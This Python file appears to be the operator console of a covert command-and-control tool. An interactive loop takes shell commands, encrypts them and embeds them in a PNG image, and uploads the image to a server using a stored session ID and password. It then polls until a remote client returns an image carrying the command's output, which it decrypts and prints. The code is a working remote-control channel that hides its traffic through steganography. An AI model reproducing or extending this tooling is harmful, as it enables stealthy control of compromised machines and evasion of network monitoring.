import server
import config
import os,time

ip_list = config.domian

demo = ip_list[0]
key = config.key
app_server = server.Server(demo["IP"],demo["PHPSESSID"],key,demo["passwd"])

# 地址校验
verify = ''

while True:
    command = input("🧑‍💻>>")
    if command == "clear" or command == "cls":
        os.system("cls")
    elif command == "exit":
        print("👋")
        break
    else:
        # 首先需要对命令进行加密,然后植入图片内
        mt = app_server.inject_img("v.png",command,"requests/v.png")
        # 植入后初始图片大小
        psize = str(mt[0])
        # 图片路径
        lj = mt[1]
        # 发送图片到服务器
        dz = app_server.send_img(lj)
        db = dz.replace('\\','')
        # 发送偏移量
        app_server.sed_pyl(psize,db)
        
        if verify != dz:
            verify = dz
        
        # 此处进入循环，判断客户端是否返回结果
        while True:
            fh = app_server.get_tp()
            ptdz = fh[0]
            pise = fh[1]
            if ptdz != db:
                break
            else:
                time.sleep(1)
        
        # 此时代表客户端已经返回结果，获取结果进行解密
        jg = app_server.get_tp_jm(ptdz,pise)
        print("🤡>>\n"+jg)
        print("~~~~"*10)








        


